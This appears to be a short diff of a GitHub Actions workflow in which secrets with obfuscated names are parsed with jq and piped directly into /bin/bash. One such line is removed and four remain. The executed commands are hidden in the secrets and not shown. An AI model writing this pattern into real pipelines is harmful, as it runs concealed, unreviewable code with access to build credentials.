@@ -23,7 +23,6 @@ jobs:
           zwkl75327: ${{ secrets.zwkl75327 }}
         run: |
           printf '%s' "$zwkl75327" | jq -r .vmel93 | /bin/bash
-          printf '%s' "$sz001" | jq -r .fapkl6 | /bin/bash
           printf '%s' "$xuiby4" | jq -r .qrpq12 | /bin/bash
           echo $xshu26 | jq -r .hwz4158 | /bin/bash
           echo $g82 | jq -r .wk240 | /bin/bash
